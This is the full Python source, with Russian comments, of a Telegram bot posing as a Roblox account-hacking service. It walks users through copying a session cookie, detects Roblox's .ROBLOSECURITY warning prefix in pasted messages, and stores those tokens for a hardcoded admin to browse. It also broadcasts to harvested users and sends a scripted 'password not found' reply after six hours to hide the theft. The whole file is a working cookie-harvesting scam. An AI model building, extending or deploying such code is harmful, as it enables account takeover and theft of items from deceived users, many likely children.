from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import json
import os
from datetime import datetime

# ⚠️ ВСТАВЬ СВОЙ ТОКЕН СЮДА
BOT_TOKEN = os.getenv("BOT_TOKEN")

# ⚠️ ТВОЙ ID АДМИНИСТРАТОРА (ТОЛЬКО ТЫ ВИДИШЬ АДМИНСКИЕ КНОПКИ)
YOUR_USER_ID = 1341594703

# ===================================================
# ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
# ===================================================

MESSAGES_FILE = "messages.json"
KEYWORD_USERS_FILE = "keyword_users.json"
ALL_USERS_FILE = "all_users.json"

KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"

# ===================================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
# ===================================================

def save_all_user(user_id, username, first_name):
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        if str(user_id) in users:
            users[str(user_id)]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        else:
            users[str(user_id)] = {
                "username": username,
                "first_name": first_name,
                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def get_all_users():
    try:
        if os.path.exists(ALL_USERS_FILE):
            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_keyword_user(user_id, username, first_name):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "username": username,
            "first_name": first_name,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения пользователя: {e}")

def is_keyword_user(user_id):
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
            return str(user_id) in users
        return False
    except:
        return False

def get_keyword_users():
    try:
        if os.path.exists(KEYWORD_USERS_FILE):
            with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}

def get_user_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id)]
        return []
    except:
        return []

def get_keyword_messages(user_id):
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
            return [msg for msg in messages if str(msg.get("user_id")) == str(user_id) and KEYWORD in msg.get("text", "")]
        return []
    except:
        return []

def save_message(user_id, username, first_name, text, timestamp):
    if not is_keyword_user(user_id):
        return
    try:
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
        else:
            messages = []
        
        messages.append({
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "text": text,
            "timestamp": timestamp
        })
        
        if len(messages) > 500:
            messages = messages[-500:]
        
        with open(MESSAGES_FILE, "w", encoding="utf-8") as f:
            json.dump(messages, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка сохранения сообщения: {e}")

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /start
# ===================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = user.first_name
    user_id = user.id
    
    save_all_user(
        user_id=user.id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    # Базовые кнопки для всех
    keyboard = [
        [
            InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
            InlineKeyboardButton("Инструкция", callback_data="cookies"),
        ],
        [
            InlineKeyboardButton("Поддержка", callback_data="support"),
        ]
    ]
    
    # Админские кнопки видны ТОЛЬКО ТЕБЕ
    if user_id == YOUR_USER_ID:
        keyboard.append([
            InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
            InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
        ])
        keyboard.append([
            InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
            InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
        ])
        keyboard.append([
            InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"Привет, {user_name}, выбери нужную категорию:",
        reply_markup=reply_markup
    )

# ===================================================
# ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
# ===================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    is_admin = (user_id == YOUR_USER_ID)
    data = query.data
    
    # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
    if data == "device":
        keyboard = [
            [
                InlineKeyboardButton("📱 Телефон", callback_data="phone"),
                InlineKeyboardButton("💻 Компьютер", callback_data="computer"),
            ],
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Выбери своё устройство:", reply_markup=reply_markup)
        return
    
    elif data == "phone":
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_phone"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/3",
            caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "computer":
        keyboard = [
            [
                InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
                InlineKeyboardButton("Скопировал куки ✅", callback_data="cookies_copied_computer"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/4",
            caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
        await query.message.reply_text(
            "Скинь cookie в бота\n"
            "И бот начнет поиск пароля вашей жертвы😈\n"
            "В течении дня бот скинет вам пароль от аккаунта"
        )
        return
    
    elif data == "cookies":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "1. Зайти на профиль жертвы\n"
            "2. Скопировать cookie\n"
            "3. Вставить cookie в бота\n"
            "4. Скинуть ссылку 📌 cookie в бота\n"
            "5. Ожидать до получения пароля и логина",
            reply_markup=reply_markup
        )
        return
    
    elif data == "support":
        keyboard = [[InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("@H1pegold\n8:00-23:00", reply_markup=reply_markup)
        return
    
    elif data == "back_to_menu":
        user_name = update.effective_user.first_name
        user_id = update.effective_user.id
        
        keyboard = [
            [
                InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
                InlineKeyboardButton("Инструкция", callback_data="cookies"),
            ],
            [
                InlineKeyboardButton("Поддержка", callback_data="support"),
            ]
        ]
        
        if user_id == YOUR_USER_ID:
            keyboard.append([
                InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
                InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
            ])
            keyboard.append([
                InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
                InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
            ])
            keyboard.append([
                InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Привет, {user_name}, выбери нужную категорию:", reply_markup=reply_markup)
        return
    
    elif data == "noop":
        await query.edit_message_text("📊 Нажмите на другую кнопку для просмотра.")
        return
    
    # --- АДМИНСКИЕ КНОПКИ ---
    if not is_admin:
        await query.edit_message_text("⚠️ Эта функция временно недоступна.")
        return
    
    # Рассылка
    if data == "send_mailing":
        keyboard = [
            [InlineKeyboardButton("📨 Всем пользователям", callback_data="mailing_all")],
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="mailing_keyword")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📨 **Выберите кому отправить рассылку:**\n\n"
            "⚠️ Сообщение будет отправлено после того, как вы его напишете.",
            reply_markup=reply_markup
        )
        return
    
    # Всем пользователям
    elif data == "mailing_all":
        context.user_data['mailing_type'] = 'all'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\n"
            "Просто отправьте сообщение в этот чат.\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    # Только с ключевым словом
    elif data == "mailing_keyword":
        context.user_data['mailing_type'] = 'keyword'
        await query.edit_message_text(
            "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\n"
            "Просто отправьте сообщение в этот чат.\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    # Все пользователи
    if data == "view_all_users":
        users = get_all_users()
        if not users:
            await query.edit_message_text("📭 Никто ещё не заходил в бота.")
            return
        
        text = "👥 **ВСЕ ПОЛЬЗОВАТЕЛИ:**\n\n"
        text += f"📊 Всего: {len(users)} пользователей\n\n"
        
        count = 0
        for user_id, user_data in users.items():
            if count >= 30:
                text += f"\n... и ещё {len(users) - 30} пользователей"
                break
            
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            first_seen = user_data.get("first_seen", "неизвестно")
            last_seen = user_data.get("last_seen", "неизвестно")
            has_keyword = "✅" if is_keyword_user(user_id) else "❌"
            
            text += f"🆔 {user_id}\n"
            text += f"👤 {name} (@{username})\n"
            text += f"📅 Первый визит: {first_seen}\n"
            text += f"🕐 Последний визит: {last_seen}\n"
            text += f"🔑 Ключевое слово: {has_keyword}\n"
            text += "─" * 25 + "\n"
            count += 1
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="view_keyword_users_only")],
            [InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # Только с ключевым словом
    elif data == "view_keyword_users_only":
        users = get_keyword_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей, отправивших ключевое слово.")
            return
        
        text = "🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n"
        text += f"📊 Всего: {len(users)} пользователей\n\n"
        
        count = 0
        for user_id, user_data in users.items():
            if count >= 30:
                text += f"\n... и ещё {len(users) - 30} пользователей"
                break
            
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            text += f"🆔 {user_id}\n"
            text += f"👤 {name} (@{username})\n"
            text += "─" * 25 + "\n"
            count += 1
        
        keyboard = [
            [InlineKeyboardButton("📩 Посмотреть сообщения", callback_data="view_keyword_messages")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
            [InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")],
            [InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # Статистика
    elif data == "view_stats":
        all_users = get_all_users()
        keyword_users = get_keyword_users()
        
        total_messages = 0
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
                total_messages = len(messages)
        
        text = "📊 **СТАТИСТИКА БОТА:**\n\n"
        text += f"👥 Всего пользователей: {len(all_users)}\n"
        text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
        text += f"📩 Сообщений сохранено: {total_messages}\n\n"
        
        today = datetime.now().strftime("%Y-%m-%d")
        today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
        text += f"📅 Новых сегодня: {today_count}\n"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")],
            [InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # Выбор пользователя для чата
    elif data == "select_user_for_chat":
        users = get_all_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей.")
            return
        
        keyboard = []
        count = 0
        for user_id, user_data in users.items():
            if count >= 20:
                break
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            has_keyword = "✅" if is_keyword_user(user_id) else "❌"
            button_text = f"👤 {name} (@{username}) {has_keyword}"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"chat_user_{user_id}")])
            count += 1
        
        if len(users) > 20:
            keyboard.append([InlineKeyboardButton(f"📊 ... и ещё {len(users) - 20} пользователей", callback_data="noop")])
        
        keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "💬 Выберите пользователя для просмотра его сообщений:\n"
            "✅ - отправил ключевое слово\n"
            "❌ - не отправлял",
            reply_markup=reply_markup
        )
        return
    
    # Просмотр сообщений с ключевым словом
    elif data == "view_keyword_messages":
        users = get_keyword_users()
        if not users:
            await query.edit_message_text("📭 Нет пользователей с ключевым словом.")
            return
        
        keyboard = []
        for user_id, user_data in users.items():
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            keyboard.append([InlineKeyboardButton(f"👤 {name} (@{username})", callback_data=f"view_user_{user_id}")])
        
        keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_users_only")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("👥 Выберите пользователя:", reply_markup=reply_markup)
        return
    
    # Просмотр сообщений конкретного пользователя
    elif data.startswith("chat_user_"):
        target_user_id = data.replace("chat_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_user_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У пользователя {name} (@{username}) пока нет сообщений.")
            return
        
        text = f"💬 **Чат с {name} (@{username})**\n"
        text += f"🆔 ID: {target_user_id}\n"
        text += f"📊 Всего сообщений: {len(messages)}\n\n"
        
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            if KEYWORD in msg_text:
                text += f"🔑 **{time}**\n💬 {msg_text}\n"
            else:
                text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("🔑 Только с ключевым словом", callback_data=f"chat_user_keyword_{target_user_id}")],
            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data.startswith("chat_user_keyword_"):
        target_user_id = data.replace("chat_user_keyword_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
            return
        
        text = f"🔑 **Cookie от {name} (@{username})**\n"
        text += f"🆔 ID: {target_user_id}\n"
        text += f"📊 Всего: {len(messages)} сообщений\n\n"
        
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("📩 Все сообщения", callback_data=f"chat_user_{target_user_id}")],
            [InlineKeyboardButton("◀️ Назад к списку", callback_data="select_user_for_chat")],
            [InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data.startswith("view_user_"):
        target_user_id = data.replace("view_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(f"📭 У {name} (@{username}) нет сообщений с ключевым словом.")
            return
        
        text = f"📋 Cookie от {name} (@{username}):\n\n"
        for msg in messages[-30:]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"💬 {msg_text}\n🕐 {time}\n"
            text += "─" * 30 + "\n"
        
        keyboard = [
            [InlineKeyboardButton("◀️ Назад", callback_data="view_keyword_messages")],
            [InlineKeyboardButton("💬 Все сообщения", callback_data=f"chat_user_{target_user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return

# ===================================================
# ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
# ===================================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text
    user = update.effective_user
    user_id = user.id
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Проверяем, находится ли админ в режиме рассылки
    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
        mailing_type = context.user_data['mailing_type']
        
        if user_message == "/cancel":
            del context.user_data['mailing_type']
            await update.message.reply_text("❌ Рассылка отменена.")
            return
        
        # Получаем список пользователей
        if mailing_type == 'all':
            users = get_all_users()
            text = "📨 **Рассылка ВСЕМ пользователям:**\n\n"
        else:  # keyword
            users = get_keyword_users()
            text = "📨 **Рассылка пользователям с ключевым словом:**\n\n"
        
        if not users:
            await update.message.reply_text("❌ Нет пользователей для рассылки.")
            del context.user_data['mailing_type']
            return
        
        # Отправляем сообщение всем
        sent = 0
        failed = 0
        
        # Отправляем себе статус
        status_msg = await update.message.reply_text(f"⏳ Начинаю рассылку для {len(users)} пользователей...")
        
        for user_id, user_data in users.items():
            try:
                # Отправляем сообщение пользователю
                await context.bot.send_message(
                    chat_id=int(user_id),
                    text=user_message
                )
                sent += 1
                # Задержка, чтобы не превысить лимиты Telegram (30 сообщений/сек)
                await asyncio.sleep(0.5)
            except Exception as e:
                failed += 1
                print(f"❌ Ошибка отправки {user_id}: {e}")
        
        # Обновляем статус
        await status_msg.edit_text(
            f"✅ **Рассылка завершена!**\n\n"
            f"📤 Отправлено: {sent}\n"
            f"❌ Не доставлено: {failed}\n"
            f"👥 Всего: {len(users)}"
        )
        
        # Удаляем режим рассылки
        del context.user_data['mailing_type']
        return
    
    # Обычная обработка сообщений (не рассылка)
    if KEYWORD in user_message:
        save_keyword_user(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown"
        )
        save_message(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown",
            text=user_message,
            timestamp=timestamp
        )
        print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
        await update.message.reply_text(
            "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
            "Не создавайте повторных заявок, иначе будете заблокированы\n"
            "Если в течении 6 часов бот не ответил, значит он не нашел пароль от аккаунта"
        )
        asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
    else:
        if is_keyword_user(user.id):
            save_message(
                user_id=user.id,
                username=user.username or "no_username",
                first_name=user.first_name or "Unknown",
                text=user_message,
                timestamp=timestamp
            )
            print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
            await update.message.reply_text("Ваше сообщение получено. Ожидайте результат.")
        else:
            await update.message.reply_text("Пожалуйста, отправьте правильный cookie для продолжения.")

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /cancel (для отмены рассылки)
# ===================================================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
        del context.user_data['mailing_type']
        await update.message.reply_text("❌ Рассылка отменена.")
    else:
        await update.message.reply_text("У вас нет активной рассылки.")

# ===================================================
# ФУНКЦИЯ ЗАДЕРЖКИ (6 часов 3 минуты)
# ===================================================

async def send_delayed_message(chat_id, context):
    delay_seconds = 6 * 3600 + 3 * 60
    try:
        await asyncio.sleep(delay_seconds)
        await context.bot.send_message(
            chat_id=chat_id,
            text="Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы."
        )
    except Exception as e:
        print(f"Ошибка при отправке отложенного сообщения: {e}")

# ===================================================
# ЗАПУСК БОТА
# ===================================================

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
    print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
    app.run_polling()

if __name__ == "__main__":
    main()
